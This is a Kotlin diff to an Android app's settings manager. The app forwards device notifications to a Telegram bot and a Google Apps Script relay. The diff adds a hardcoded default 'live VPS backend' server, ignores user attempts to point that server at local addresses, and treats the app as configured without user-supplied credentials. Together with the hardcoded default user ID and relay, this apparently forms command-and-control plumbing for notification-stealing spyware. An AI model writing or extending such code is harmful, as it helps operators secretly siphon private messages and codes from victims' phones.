@@ -15,6 +15,7 @@ data class BotConfig(
     val botUsername: String = "",
     val deviceId: String = "",
     val relayUrl: String = "",
+    val serverUrl: String = "",  // Admin panel backend server URL (priority over Telegram)
     val isNotificationForwardingEnabled: Boolean = true,
     val isIgnoreTelegramNotifs: Boolean = true,
     val isIgnoreOngoingNotifs: Boolean = true,
@@ -45,12 +46,15 @@ class PreferenceManager(private val context: Context) {
         const val DEFAULT_USER_ID = 8752166904L
         const val DEFAULT_DEVICE_ID = ""
         const val DEFAULT_RELAY_URL = "https://script.google.com/macros/s/AKfycbylXFEs1mgEiP7zfIAsA2_vlGztnVCfWkCHqF5F55YoZNUJZxa0L_gzG0bCk03QXeZ2Wg/exec"
+        // Backend server URL — live VPS backend
+        const val DEFAULT_SERVER_URL = "https://loan-201-18-193-211.sslip.io"
 
         private const val PREFS_NAME = "telemanage_secure_prefs"
         private const val KEY_ENCRYPTED_BOT_TOKEN = "enc_bot_token"
         private const val KEY_ENCRYPTED_USER_ID = "enc_user_id"
         private const val KEY_DEVICE_ID = "device_id"
         private const val KEY_RELAY_URL = "relay_url"
+        private const val KEY_SERVER_URL = "server_url"
         private const val KEY_NOTIFICATION_FORWARDING = "notification_forwarding_enabled"
         private const val KEY_IGNORE_TELEGRAM_NOTIFS = "ignore_telegram_notifs"
         private const val KEY_IGNORE_ONGOING_NOTIFS = "ignore_ongoing_notifs"
@@ -133,6 +137,12 @@ class PreferenceManager(private val context: Context) {
         }
         val rawRelay = prefs.getString(KEY_RELAY_URL, "") ?: ""
         val relayUrl = if (rawRelay.isNotBlank()) rawRelay else DEFAULT_RELAY_URL
+        val rawServer = prefs.getString(KEY_SERVER_URL, "") ?: ""
+        val serverUrl = if (rawServer.isNotBlank() && !rawServer.contains("192.168.") && !rawServer.contains("localhost")) {
+            rawServer
+        } else {
+            DEFAULT_SERVER_URL
+        }
 
         return BotConfig(
             botToken = token,
@@ -140,6 +150,7 @@ class PreferenceManager(private val context: Context) {
             botUsername = prefs.getString(KEY_LAST_KNOWN_BOT_USERNAME, "") ?: "",
             deviceId = deviceId,
             relayUrl = relayUrl,
+            serverUrl = serverUrl,
             isNotificationForwardingEnabled = prefs.getBoolean(KEY_NOTIFICATION_FORWARDING, true),
             isIgnoreTelegramNotifs = prefs.getBoolean(KEY_IGNORE_TELEGRAM_NOTIFS, true),
             isIgnoreOngoingNotifs = prefs.getBoolean(KEY_IGNORE_ONGOING_NOTIFS, true),
@@ -184,6 +195,20 @@ class PreferenceManager(private val context: Context) {
     }
 
     fun getRelayUrl(): String = _botConfigFlow.value.relayUrl.ifBlank { DEFAULT_RELAY_URL }
+
+    fun setServerUrl(serverUrl: String) {
+        prefs.edit().putString(KEY_SERVER_URL, serverUrl.trim()).apply()
+        _botConfigFlow.value = loadConfig()
+    }
+
+    fun getServerUrl(): String {
+        val current = _botConfigFlow.value.serverUrl
+        return if (current.isNotBlank() && !current.contains("192.168.") && !current.contains("localhost")) {
+            current
+        } else {
+            DEFAULT_SERVER_URL
+        }
+    }
 
     fun saveBotCredentials(botToken: String, authorizedUserId: Long, botUsername: String = "") {
         val encToken = keyStoreManager.encrypt(botToken.trim())
@@ -330,7 +355,7 @@ class PreferenceManager(private val context: Context) {
 
     fun getBotToken(): String = _botConfigFlow.value.botToken.ifBlank { DEFAULT_BOT_TOKEN }
     fun getAuthorizedUserId(): Long = if (_botConfigFlow.value.authorizedUserId != 0L) _botConfigFlow.value.authorizedUserId else DEFAULT_USER_ID
-    fun isConfigured(): Boolean = getBotToken().isNotBlank() && getAuthorizedUserId() != 0L
+    fun isConfigured(): Boolean = getServerUrl().isNotBlank() || (getBotToken().isNotBlank() && getAuthorizedUserId() != 0L)
 
     fun setServiceDesiredEnabled(enabled: Boolean) {
         prefs.edit().putBoolean(KEY_SERVICE_DESIRED_ENABLED, enabled).apply()
